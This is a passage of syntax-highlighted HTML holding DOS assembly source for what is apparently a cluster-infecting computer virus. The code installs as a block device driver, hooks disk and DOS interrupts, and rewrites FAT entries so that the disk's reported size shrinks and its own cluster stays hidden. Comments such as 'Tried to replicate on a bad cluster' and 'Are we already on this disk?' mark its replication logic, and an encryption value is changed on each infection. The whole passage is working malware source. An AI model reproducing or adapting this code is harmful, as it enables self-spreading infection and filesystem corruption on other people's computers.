         </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">jump</span><span class="sc0">                             </span><span class="sc1">; ES:BX = param block</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4dh</span><span class="sc0">                           </span><span class="sc1">; Get errorlevel</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">jump</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0">                           </span><span class="sc1">; Terminate</span><span class="sc0">

</span><span class="sc5">jump</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pushf</span><span class="sc0">                                  </span><span class="sc1">; Simulate an interrupt 21h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">i21org</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;--------Installation complete</span><span class="sc0">

</span><span class="sc5">i13pr</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                             </span><span class="sc1">; Write AL sectors from ES:BX</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">i13org</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; to track CH, sector CL,</span><span class="sc0">
                                                </span><span class="sc1">; head DH, drive DL</span><span class="sc0">


</span><span class="sc5">main</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">; driver</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc0">            </span><span class="sc1">; strategy block</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">                               </span><span class="sc1">; Move segment of parameter</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">                               </span><span class="sc1">; block to DS</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">; [bx+2] holds command code</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                             </span><span class="sc1">; Input (read)</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">    </span><span class="sc5">input</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                             </span><span class="sc1">; Output (write)</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">    </span><span class="sc5">output</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                             </span><span class="sc1">; Output (write) with verify</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">    </span><span class="sc5">output</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">in_</span><span class="sc0">                              </span><span class="sc1">; Call original device</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                             </span><span class="sc1">; Request build BPB</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">   </span><span class="sc5">ppp</span><span class="sc0">                              </span><span class="sc1">; If none of the above, exit</span><span class="sc0">
         </span><span class="sc6">lds</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; DS:SI point to BPB table</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">bpb_buf</span><span class="sc0">                </span><span class="sc1">; Replace old pointer with</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">; a pointer to our own</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">                   </span><span class="sc1">; BPB table</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">                               </span><span class="sc1">; Save segment of parameters</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">                            </span><span class="sc1">; Copy the old BPB table to</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0">   </span><span class="sc6">movsw</span><span class="sc0">                            </span><span class="sc1">; our own</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc0">                               </span><span class="sc1">; Restore parameter segment</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">; AL = sectors per allocation</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                             </span><span class="sc1">;      unit.  If less than</span><span class="sc0">
         </span><span class="sc6">adc</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                             </span><span class="sc1">;      2, increment</span><span class="sc0">
         </span><span class="sc6">cbw</span><span class="sc0">                                    </span><span class="sc1">; Extend sign to AH (clear AH)</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">-</span><span class="sc2">32</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">; Is total number sectors = 0?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">    </span><span class="sc5">m32</span><span class="sc0">                              </span><span class="sc1">; If so, big partition (&gt;32MB)</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">-</span><span class="sc2">32</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; Decrease space of disk by</span><span class="sc0">
                                                </span><span class="sc1">; one allocation unit(cluster)</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ppp</span><span class="sc0">                        </span><span class="sc1">; Exit</span><span class="sc0">
</span><span class="sc5">m32</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">-</span><span class="sc2">32</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; Handle large partitions</span><span class="sc0">
         </span><span class="sc6">sbb</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">-</span><span class="sc2">32</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ppp</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">rts</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">retf</span><span class="sc0">                                   </span><span class="sc1">; We are outta here!</span><span class="sc0">

</span><span class="sc5">output</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0ff09h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">check</span><span class="sc0">                            </span><span class="sc1">; is it a new disk?</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">inf_sec</span><span class="sc0">                          </span><span class="sc1">; If not, go away</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">in_</span><span class="sc0">                              </span><span class="sc1">; Call original device handler</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">inf_dsk</span><span class="sc0">

</span><span class="sc5">inf_sec</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">_inf_sec</span><span class="sc0">
</span><span class="sc5">read</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">_read</span><span class="sc0">
</span><span class="sc5">read_</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">                            </span><span class="sc1">; Restore the stack</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ppp</span><span class="sc0">                        </span><span class="sc1">; Leave device driver</span><span class="sc0">

</span><span class="sc5">input</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">check</span><span class="sc0">                            </span><span class="sc1">; Is it a new disk?</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">read</span><span class="sc0">                             </span><span class="sc1">; If not, leave</span><span class="sc0">
</span><span class="sc5">inf_dsk</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">                </span><span class="sc1">; Set command code to READ</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; Load from buffer address</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                             </span><span class="sc1">; Save device driver request</span><span class="sc0">
</span><span class="sc5">save</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lodsw</span><span class="sc0">                                  </span><span class="sc1">; on the stack</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0">  </span><span class="sc5">save</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">; Starting sector number = 1</span><span class="sc0">
                                                </span><span class="sc1">; (Read 1st FAT)</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">driver</span><span class="sc0">                           </span><span class="sc1">; Read one sector</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">read_</span><span class="sc0">                            </span><span class="sc1">; If error, exit</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">                </span><span class="sc1">; Otherwise build BPB</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">in_</span><span class="sc0">                              </span><span class="sc1">; Have original driver do the</span><span class="sc0">
                                                </span><span class="sc1">; work</span><span class="sc0">
         </span><span class="sc6">lds</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; DS:SI points to BPB table</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">; Number root directory entries</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">                            </span><span class="sc1">; Round up</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
         </span><span class="sc6">shr</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                            </span><span class="sc1">; Divide by 16 to find sectors</span><span class="sc0">
                                                </span><span class="sc1">; of root directory</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0bh</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; DI = sectors/FAT</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                            </span><span class="sc1">; Double for 2 FATs</span><span class="sc0">
         </span><span class="sc6">stc</span><span class="sc0">                                    </span><span class="sc1">; Add one for boot record</span><span class="sc0">
         </span><span class="sc6">adc</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                            </span><span class="sc1">; Add sector size of root dir</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc0">                               </span><span class="sc1">; to find starting sector of</span><span class="sc0">
                                                </span><span class="sc1">; data (and read)</span><span class="sc0">
         </span><span class="sc6">cwd</span><span class="sc0">                                    </span><span class="sc1">; Clear DX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">; AX = total sectors</span><span class="sc0">
         </span><span class="sc6">test</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                            </span><span class="sc1">; If it is zero, then we have</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">more</span><span class="sc0">                             </span><span class="sc1">; an extended partition(&gt;32MB)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; Load DX:AX with total number</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; of sectors</span><span class="sc0">
</span><span class="sc5">more</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                            </span><span class="sc1">; Calculate FAT entry for last</span><span class="sc0">
                                                </span><span class="sc1">; sector of disk</span><span class="sc0">
         </span><span class="sc6">sbb</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cl</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">; CL = sectors/cluster</span><span class="sc0">
         </span><span class="sc6">div</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc0">                               </span><span class="sc1">; AX = cluster #</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                             </span><span class="sc1">; If there is more than 1</span><span class="sc0">
         </span><span class="sc6">sbb</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">; cluster/sector, add one</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">                               </span><span class="sc1">; Save cluster number</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">convert</span><span class="sc0">                          </span><span class="sc1">; AX = sector number to read</span><span class="sc0">
                                                </span><span class="sc1">; DX = offset in sector AX</span><span class="sc0">
                                                </span><span class="sc1">;      of FAT entry</span><span class="sc0">
                                                </span><span class="sc1">; DI = mask for EOF marker</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">             </span><span class="sc1">; INPUT (read)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; Starting sector = AX</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">driver</span><span class="sc0">                           </span><span class="sc1">; One sector only</span><span class="sc0">
</span><span class="sc5">again</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lds</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; DS:SI = buffer address</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                            </span><span class="sc1">; Go to FAT entry</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                            </span><span class="sc1">; Calculate a new encryption</span><span class="sc0">
         </span><span class="sc6">adc</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                            </span><span class="sc1">; value</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">gad</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">             </span><span class="sc1">; Change the encryption value</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                             </span><span class="sc1">; If there is 0 cluster/sector</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">    </span><span class="sc5">small_</span><span class="sc0">                           </span><span class="sc1">; then jump to "small_"</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">; Load AX with offset of FAT</span><span class="sc0">
                                                </span><span class="sc1">; entry</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                            </span><span class="sc1">; Mask it with value from</span><span class="sc0">
                                                </span><span class="sc1">; "convert" then test to see</span><span class="sc0">
                                                </span><span class="sc1">; if the sector is fine</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0fff7h</span><span class="sc0">                        </span><span class="sc1">; 16 bit reserved/bad</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">    </span><span class="sc5">bad</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ff7h</span><span class="sc0">                         </span><span class="sc1">; 12 bit reserved/bad</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">    </span><span class="sc5">bad</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ff70h</span><span class="sc0">                        </span><span class="sc1">; 12 bit reserved/bad</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">   </span><span class="sc5">ok</span><span class="sc0">
</span><span class="sc5">bad</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">                               </span><span class="sc1">; Tried to replicate on a bad</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">                               </span><span class="sc1">; cluster.  Try again on a</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">                               </span><span class="sc1">; lower one.</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">convert</span><span class="sc0">                          </span><span class="sc1">; Find where it is in the FAT</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">again</span><span class="sc0">                      </span><span class="sc1">; and try once more</span><span class="sc0">
</span><span class="sc5">small_</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">not</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc0">                               </span><span class="sc1">; Reverse mask bits</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">                          </span><span class="sc1">; Clear other bits</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">                               </span><span class="sc1">; AX = cluster number</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">                               </span><span class="sc1">; Need to do 2 consecutive</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">                               </span><span class="sc1">; bytes</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">
         </span><span class="sc6">test</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">here</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc0">                               </span><span class="sc1">; Multiply by 16</span><span class="sc0">
         </span><span class="sc6">mul</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">here</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">or</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">; Set cluster to next</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">                               </span><span class="sc1">; Restore cluster of write</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">convert</span><span class="sc0">                          </span><span class="sc1">; Calculate buffer offset</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Go to FAT entry (in buffer)</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">ok</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                            </span><span class="sc1">; DI = mask from "convert"</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                            </span><span class="sc1">; Yerg!</span><span class="sc0">
         </span><span class="sc6">not</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">                          </span><span class="sc1">; Set [si] to DI</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                            </span><span class="sc1">; Did we change the FAT?</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">                               </span><span class="sc1">; i.e. Are we already on this</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc0">                               </span><span class="sc1">; disk?</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">pointer</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; Our own starting cluster</span><span class="sc0">
